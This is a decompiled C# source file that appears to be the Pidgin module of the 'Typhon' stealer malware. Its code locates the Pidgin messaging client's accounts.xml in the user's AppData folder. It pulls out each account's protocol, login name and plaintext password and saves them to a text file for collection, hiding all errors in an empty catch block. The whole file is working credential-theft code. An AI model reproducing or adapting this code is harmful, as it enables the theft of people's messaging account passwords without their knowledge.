using System;
using System.IO;
using System.Text;
using System.Xml;

namespace Typhon.Stealer.Software.Messaging
{
	// Token: 0x02000018 RID: 24
	internal class Pidgin
	{
		// Token: 0x06000069 RID: 105 RVA: 0x00004D5C File Offset: 0x00002F5C
		public static void EnumerateLogins(string sSavePath)
		{
			if (!File.Exists(Pidgin.PidginPath))
			{
				return;
			}
			try
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(new XmlTextReader(Pidgin.PidginPath));
				foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
				{
					XmlNode xmlNode = (XmlNode)obj;
					string innerText = xmlNode.ChildNodes[0].InnerText;
					string innerText2 = xmlNode.ChildNodes[1].InnerText;
					string innerText3 = xmlNode.ChildNodes[2].InnerText;
					if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3))
					{
						break;
					}
					Pidgin.stringBuilder.AppendLine("Protocol: " + innerText);
					Pidgin.stringBuilder.AppendLine("Login: " + innerText2);
					Pidgin.stringBuilder.AppendLine("Password: " + innerText3 + "\r\n");
				}
				if (Pidgin.stringBuilder.Length > 0)
				{
					Directory.CreateDirectory(sSavePath);
					File.AppendAllText(sSavePath + "\\Pidgin Accounts.txt", Pidgin.stringBuilder.ToString());
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000039 RID: 57
		private static StringBuilder stringBuilder = new StringBuilder();

		// Token: 0x0400003A RID: 58
		private static readonly string PidginPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple\\accounts.xml");
	}
}
